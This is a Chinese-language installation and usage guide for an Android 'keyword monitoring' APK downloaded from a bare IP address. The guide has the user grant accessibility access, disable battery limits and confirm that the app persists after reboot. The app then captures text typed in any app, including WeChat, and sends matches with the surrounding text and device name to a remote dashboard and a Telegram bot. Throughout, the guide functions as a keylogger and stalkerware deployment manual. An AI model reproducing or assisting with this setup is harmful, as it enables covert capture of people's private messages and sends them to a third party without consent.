📦 一、下载APP

http://38.49.29.167:3000/关键词监控-强制引导版.apk


📲 二、安装APP（重要！）
-----------------

1. 手机下载APK文件

2. 允许安装未知来源应用
   - 设置 → 安全 → 允许安装未知来源

3. 安装APK

4. 首次打开APP - 自动引导设置（⚠️ 所有步骤必须完成）

   ✅ 步骤1: 欢迎界面
      → 点击"开始设置"

   ✅ 步骤2: 配置服务器地址
      → 输入: http://38.49.29.167:3000
      → 点击"下一步"

   ✅ 步骤3: 允许后台运行 ⭐ 最关键！
      → 点击"去设置"
      → 选择"不受限制"或"无限制"或"允许"
      → 返回APP
      → 如果没设置好，会提示"请完成设置"，必须重新设置

   ✅ 步骤4: 启用辅助功能 ⭐ 必须开启！
      → 点击"去设置"
      → 找到"关键词监控"
      → 打开开关
      → 允许所有权限
      → 返回APP（会自动检测）

   ✅ 步骤5: 设置完成
      → 显示"✅ 设置完成！"
      → 点击"进入应用"

5. 完成！现在可以关闭APP，服务会持续运行


🎮 三、使用管理后台
-----------------

1. 打开浏览器访问：
   http://38.49.29.167:3000

2. 添加关键词
   → 输入关键词（例如：测试）
   → 选择匹配类型：
      • 完全匹配：只有完全相同的词才触发
      • 模糊匹配：文段中包含关键词就触发
   → 点击"添加"

3. 配置Telegram通知（可选）
   → 点击"Telegram机器人配置"
   → 输入Bot Token和Chat ID
   → 点击"保存配置"
   → 点击"测试发送"验证

4. 查看警告
   → 警告通知面板会显示：
      • 设备名称
      • 触发的关键词
      • 相关文本内容
      • 设备本地时间


📱 四、手机测试
-----------------

1. 打开手机上任意输入应用（微信、记事本等）

2. 输入你设置的关键词

3. 查看管理后台"警告通知"
   → 应该立即显示触发记录

4. 如果配置了Telegram
   → Telegram群内也会收到通知


✅ 五、验证持续运行
-----------------

✅ 方法1: 完全退出APP
   1. 返回主屏幕
   2. 清理后台任务（滑掉APP）
   3. 等待5分钟
   4. 输入关键词测试
   5. 检查管理后台 → 应该仍然能收到警告！

✅ 方法2: 重启手机
   1. 完成所有设置后，重启手机
   2. 重启后不要打开APP
   3. 直接输入关键词测试
   4. 检查管理后台 → 应该能收到警告！（开机自启）

✅ 成功标志：
   • 通知栏显示"关键词监控运行中"
   • 管理后台收到警告
   • Telegram收到通知（如果配置）


🔧 六、如果引导失败
-----------------

如果在引导过程中出现问题：

1. 卸载APP，重新安装
2. 重新完成引导流程
3. 确保每个步骤都成功（特别是步骤3和4）

特别注意：
• 步骤3（电池优化）必须选择"无限制"
• 步骤4（辅助功能）必须打开开关
• 两个步骤都完成后，APP才会让你进入主界面


⚠️ 七、重要提示
-----------------

⭐ 1. 后台运行设置最重要！
   必须在电池优化中选择"不受限制"

⭐ 2. 辅助功能必须保持开启！
   这是监控的核心，关闭了就不工作

⭐ 3. 通知栏不要关闭！
   "关键词监控运行中"通知确保服务不被杀

⭐ 4. 不要清理APP后台！
   可以按Home键，但不要在多任务中清理

⭐ 5. 手机系统更新后重新检查！
   有时系统更新会重置设置

💡 十、使用技巧
-----------------

1. 关键词设置技巧：
   • 完全匹配：用于精确监控特定词汇
   • 模糊匹配：用于监控包含某词的句子

2. Telegram通知：
   • 可以建一个专门的监控群
   • 把Bot加入群，获取群ID
   • 实时收到推送，比查看网页方便

3. 多设备管理：
   • 可以给每个手机取不同名字
   • 方便区分是哪台设备触发

4. 省电技巧：
   • 虽然要关闭电池优化，但实际耗电很少
   • 辅助功能只在输入时工作
   • 待机时几乎不耗电
